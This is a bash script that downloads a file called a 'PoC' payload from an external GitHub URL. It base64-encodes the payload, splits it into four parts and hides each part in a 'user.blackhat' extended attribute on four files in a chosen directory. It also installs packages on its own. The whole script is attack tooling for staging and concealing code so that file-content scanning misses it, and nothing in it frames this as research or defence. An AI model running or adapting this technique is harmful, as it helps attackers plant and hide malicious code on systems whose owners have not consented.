#!/bin/bash
set -euo pipefail

# Usage: $0 <target_directory> [pattern]
# pattern: glob for file names (e.g., "*.txt"), default is all files (*)
if [ $# -lt 1 ]; then
  echo "Usage: $0 <target_directory> [pattern]"
  exit 1
fi

TARGET_DIR="$1"
PATTERN="${2:-*}"

if [ ! -d "$TARGET_DIR" ]; then
  echo "Error: $TARGET_DIR is not a directory"
  exit 1
fi

# 1) Ensure xattr tools are installed
if ! command -v setfattr &>/dev/null; then
  echo "[*] Installing attr + curl..."
  apt update
  apt install -y attr curl
fi

# 2) Download the new PoC
POC_URL="https://raw.githubusercontent.com/0xChadou/lg_update/refs/heads/main/updater.py"
echo "[*] Fetching payload from $POC_URL"
PAYLOAD=$(curl -fsSL "$POC_URL")

# 3) Base64‑encode
ENC=$(printf '%s' "$PAYLOAD" | base64 -w0)
LEN=${#ENC}
echo "[*] Total encoded size: $LEN bytes"

# 4) Compute split points
QSIZE=$(( LEN / 4 ))
Q2=$(( QSIZE * 2 ))
Q3=$(( QSIZE * 3 ))
echo "[*] Splitting into 4 parts (~${QSIZE} bytes each)"

# 5) Slice into four chunks
CHUNKS=(
  "${ENC:0:QSIZE}"
  "${ENC:QSIZE:QSIZE}"
  "${ENC:Q2:QSIZE}"
  "${ENC:Q3}"
)

# 6) Select files by criteria: glob pattern, sorted
mapfile -t FILES < <(find "$TARGET_DIR" -maxdepth 1 -type f -name "$PATTERN" | sort | head -n 4)
if [ "${#FILES[@]}" -lt 4 ]; then
  echo "Error: Found only ${#FILES[@]} files matching '$PATTERN' in $TARGET_DIR; need at least 4."
  exit 1
fi

# 7) Write each chunk into its file's xattr
for idx in "${!CHUNKS[@]}"; do
  CHUNK_VAL="${CHUNKS[$idx]}"
  TARGET_FILE="${FILES[$idx]}"
  echo "[*] Writing part $((idx + 1)) to $TARGET_FILE"
  setfattr -n user.blackhat -v "$CHUNK_VAL" "$TARGET_FILE"
done

echo "[+] Done! Payload divided across 4 files matching '$PATTERN' in $TARGET_DIR."
